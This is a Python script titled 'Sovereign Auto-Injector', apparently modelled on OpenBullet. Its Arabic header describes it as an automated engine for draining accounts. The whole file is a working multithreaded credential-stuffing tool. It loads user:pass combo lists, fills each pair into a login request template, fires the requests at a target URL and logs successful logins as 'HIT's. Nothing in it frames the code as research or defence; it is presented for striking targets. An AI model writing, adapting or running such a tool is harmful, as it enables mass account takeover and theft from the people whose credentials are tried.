#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sovereign Auto-Injector v1.0 (OpenBullet 2 Reborn)
المحرك الآلي لاستنزاف الحسابات وفحص الثغرات الجماعي.
(c) 2026 Al-Mu'izz Sovereign Systems - Al-Ghazali Root
"""
import requests
import threading
import queue
import json
import time
import sys
import os
from datetime import datetime

class AutoInjector:
    def __init__(self, config_json):
        self.config = json.loads(config_json)
        self.target_url = self.config.get('url')
        self.method = self.config.get('method', 'POST')
        self.payload_template = self.config.get('payload', '')
        self.success_key = self.config.get('success_key', 'success')
        self.threads_count = self.config.get('threads', 10)
        self.work_queue = queue.Queue()
        self.results = []
        self.running = False

    def load_wordlist(self, file_path):
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    self.work_queue.put(line.strip())

    def worker(self):
        while not self.work_queue.empty() and self.running:
            combo = self.work_queue.get()
            try:
                # Assuming combo format user:pass
                if ':' in combo:
                    user, password = combo.split(':', 1)
                    payload = self.payload_template.replace('<USER>', user).replace('<PASS>', password)
                    
                    start_time = time.time()
                    if self.method == 'POST':
                        resp = requests.post(self.target_url, data=payload, timeout=10)
                    else:
                        resp = requests.get(self.target_url, params=payload, timeout=10)
                    
                    if self.success_key in resp.text:
                        result = {"combo": combo, "status": "HIT", "time": f"{time.time() - start_time:.2f}s"}
                        self.results.append(result)
                        print(f"[HIT] {combo}")
                
            except Exception as e:
                pass
            finally:
                self.work_queue.task_done()

    def ignite(self):
        print(f"[*] Sovereign Auto-Injector: Striking {self.target_url}")
        self.running = True
        threads = []
        for _ in range(self.threads_count):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        self.work_queue.join()
        self.running = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) > 2:
        conf = sys.argv[1]
        wlist = sys.argv[2]
        injector = AutoInjector(conf)
        injector.load_wordlist(wlist)
        results = injector.ignite()
        print(json.dumps(results, indent=2))
